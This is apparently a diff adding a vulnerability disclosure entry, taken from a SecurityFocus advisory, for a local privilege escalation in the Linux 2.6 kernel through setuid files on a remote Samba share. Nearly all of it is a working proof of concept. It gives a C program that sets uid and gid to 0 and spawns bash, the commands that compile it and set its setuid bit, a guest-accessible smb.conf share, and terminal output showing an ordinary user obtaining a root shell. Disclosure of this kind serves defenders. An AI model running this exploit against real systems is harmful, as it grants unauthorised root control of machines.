@@ -1,0 +1,50 @@
+source: http://www.securityfocus.com/bid/9619/info
+
+A local privilege escalation vulnerability has been reported to affect the 2.6 Linux kernel.
+
+The issue appears to exist due to a lack of sufficient sanity checks performed when executing a file that is hosted on a remote Samba share. An attacker may exploit this condition to gain elevated privileges, as the setuid/setgid bit of a remote file is honored on the local system.
+
+misko@slovakia:~$ smbmount --version
+Usage: mount.smbfs service mountpoint [-n] [-o options,...]
+Version 3.0.1-Debian
+
+misko@slovakia:~$ ls -l /usr/bin/smbmount
+- - -rwxr-xr-x 1 root root 591756 2004-01-13 20:29 /usr/bin/smbmount
+misko@slovakia:~$ ls -l /usr/bin/smbmnt
+- - -rwsr-sr-x 1 root root 8088 2004-01-13 20:29 /usr/bin/smbmnt
+^
+
+Confirmed to be default on Debian and Mandrake.
+
+share:/data/share# cat a.c
+main()
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+
+share:/data/share# make a
+cc a.c -o a
+share:/data/share# chmod +s a
+share:/data/share#
+
+share:/etc/samba/smb.conf
+
+[share]
+path = /data/share
+writable = no
+locking = no
+public = yes
+guest ok = yes
+comment = Share
+
+share:/data/share# ls -l a
+- - -rwsr-sr-x 1 root root 11716 Feb 8 12:39 a
+
+misko@slovakia:~$ ls -l pokus/a
+- - -rwsr-sr-x 1 root root 11716 2004-02-08 12:39 pokus/a
+misko@slovakia:~$ pokus/a
+root@slovakia:~# id
+uid=0(root) gid=0(root) skupiny=1000(misko),0(root),29(audio),100(users),1034(mtr),1035(333)
+root@slovakia:~#
